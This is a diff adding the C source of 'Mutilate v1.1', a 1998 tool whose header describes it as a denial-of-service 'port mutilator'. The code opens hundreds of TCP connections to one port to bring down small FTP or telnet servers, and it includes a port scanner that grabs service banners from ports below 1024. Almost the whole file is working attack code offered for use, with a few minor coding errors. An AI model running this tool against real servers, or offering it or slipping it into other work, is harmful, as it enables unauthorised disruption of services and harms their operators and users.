@@ -1,0 +1,171 @@
+ /*********************************************
+ *  Mutilate v1.1                             * 
+ * By HoGs HeaD                               * 
+ * ------------------------------------------ * 
+ * What this program does:                    *  
+ * ------------------------------------------ * 
+ * This is a port mutilator, connects as      *
+ * many times as possible to a port resulting *
+ * in a DoS attack or lag kill. Run it on     *
+ * a small FTP server or telnet server and    *
+ * watch the daemons fall....                 *
+ * Updated portscanner... now returns         *
+ * remote port information.                   *
+ * Build using:                               *
+ *                                            *  
+ * $ gcc mutilate -o mutilate.c               * 
+ *                                            *
+ * You can't modify this and redistribute it  *
+ * unless we have given you permission.       * 
+ *                                            *
+ * (C)1998 HoGs HeaD and Inertia              *
+ *********************************************/
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
+#include <errno.h>
+#include <netdb.h>
+#include <signal.h>
+
+#define PROG_NAME "Mutilate"
+#define HIGH_PORT 1024
+
+
+/***************
+* Usage Table  *
+****************/
+
+void usage()
+{
+printf("usage: %s <IP address> <port (or -s for scan)>\n\n", PROG_NAME);
+exit(0);
+}
+
+/****************
+* Title Banner  *
+*****************/
+
+void banner()
+{
+puts("\nMutilate by HoGs HeaD and Inertia");
+puts("----------------------------------\n");
+}
+
+/********************
+* PortScan Function *
+********************/
+
+void portscan(char *the_ip)
+{   
+   struct hostent *scand;          /* Well golly jeepers batman, let's init some shiz... */
+   struct sockaddr_in scan;
+   char *in[100];
+   int sck; 
+   int c, portnum;
+
+     for(portnum=1; portnum<HIGH_PORT; portnum++){                /* start the hunt.. */
+   
+       if(isdigit(*the_ip)){
+	 scan.sin_addr.s_addr = inet_addr(the_ip);
+     } else{                                                 /* resolve the host */
+	 scand = gethostbyname(the_ip);
+	 strncpy((char *)&scan.sin_addr, (char *)scand->h_addr, sizeof(scan.sin_addr));     
+	   }
+   
+     scan.sin_family = AF_INET;
+     scan.sin_port   = htons(portnum);
+     sck = socket(AF_INET, SOCK_STREAM, 0);               /* create the socket */
+    
+       if(sck < 0){
+	 printf("Socket cannot be established!\n");
+		  }
+
+     c = connect(sck, (struct sockaddr *)&scan, sizeof(scan)); /* connect the socket */
+       if(c < 0){
+		  /* we aren't connected, so... */
+     } else{
+		 /* we're connected, bewm, notify user. */
+	 printf("Found an open port on %d...\n", portnum);
+	 if(portnum==13 | portnum==19 | portnum==21 | portnum==23 | portnum==25 | portnum==110){
+	 bzero(in, 8);   /* Only snag info from ports that send information */
+	 recv(sck, in, 100, 0);
+	 printf("Remote snagged info: %s\n", in);        
+	 }
+	   }
+  
+ shutdown(sck, 2);
+}
+ close(sck);
+}
+
+
+/****************
+* Main Function *
+****************/
+
+void main(int argc, char **argv)
+{
+    struct hostent *th;
+    struct sockaddr_in target[400];
+    int count=1, log;
+    int sock, error, port;
+    char *curr_ip, *out[100];
+  
+   banner();
+  
+   if(argc < 3){
+     usage();
+	      }
+  
+  curr_ip = argv[1];
+
+    if (!strcmp (argv[2], "-s")) {
+      printf("Beginning a port scan on %s...\n\n", argv[1]);
+      portscan(argv[1]);
+	exit(0);
+				 }
+   
+  port = atoi(argv[2]);
+  printf("Now opening connections to %s...\n\n", curr_ip);
+
+ /*******************   
+ * Begin Mutilation *
+ *******************/
+
+ for(; count<400; ++count) 
+ {  
+      
+   if(isdigit(*curr_ip))     /* If the host specified is a numerical IP */
+     target[count].sin_addr.s_addr = inet_addr(curr_ip);     
+   else {                    /* If the host specified as a hostname */
+     th = gethostbyname(curr_ip);
+     strncpy((char *)&target[count].sin_addr, (char *)th->h_addr, sizeof(target[count].sin_addr));
+	}
+   
+      target[count].sin_family = AF_INET;
+      target[count].sin_port = htons(port);
+      sock = socket(AF_INET, SOCK_STREAM, 0);
+   
+    if(sock < 0){
+      printf("Error setting up socket!\n");
+      exit(2);
+		}
+   
+      error = connect(sock, (struct sockaddr *)&target[count], sizeof target[count]);
+   
+    error < 0 ? printf("Error connecting to: %d : %s\n", port, strerror(errno)) : printf("Opened %d sockets to host...\n", count);
+	 
+  }
+			 
+  printf("\nOpened 400 socks to server, ending...\n");
+  close(sock);
+}
+
+/***************
+* End Program  *
+***************/
